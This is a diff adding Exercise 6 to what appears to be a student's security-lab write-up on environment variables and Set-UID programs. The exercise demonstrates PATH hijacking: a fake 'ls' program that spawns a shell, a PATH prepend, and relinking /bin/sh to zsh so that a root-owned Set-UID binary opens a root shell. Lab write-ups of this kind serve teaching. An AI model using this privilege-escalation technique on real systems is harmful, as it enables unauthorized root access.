@@ -153,3 +153,41 @@ Using **Step 2** executable to chek the environment variables:
 ![uid](/Lab6/exercise5/img/3.png)
 
 When a Set-UID program is executed, it runs with the permissions of the program's owner (in this case, root), rather than the user who executed it (seed). Despite this change in user identity, the environment variables are still inherited from the parent process (seed) instead of using root environment variables.
+
+## Exercise 6:  The PATH Environment Variable and `Set-UID` Programs
+
+We compile `/Lab6/exercise6/pathuid.c` on `/Lab6/exercise6/puid`, change its owner to root, and make it a Set-UID program.
+
+![lsuid](/Lab6/exercise6/img/1.png)
+
+We can get this Set-UID program to run our own malicious code. Instead of /bin/ls we can run the bash with root privilege.
+
+**Set up**
+
+First we need a new script `/Lab6/exercise6/ls` that will contain our malicious code, this code will be compiled from `/Lab6/exercise6/exploit.c`
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(){
+	printf("Malicious ls program is called\n");
+	system("/bin/zsh");
+	return 0;
+}
+```
+
+Next, we need to add our path to our current environment variables using:
+
+```bash
+export PATH=<Path where our ls script is>:$PATH
+```
+
+Since we are working on ubuntu 20.04 we need to change our default bash:
+```bash
+sudo ln -sf /bin/zsh /bin/sh
+```
+
+Now we just execute our `/Lab6/exercise6/puid` file (that calls our ls script) and we can get into the bash with root privileges.
+
+![lsuid](/Lab6/exercise6/img/2.png)
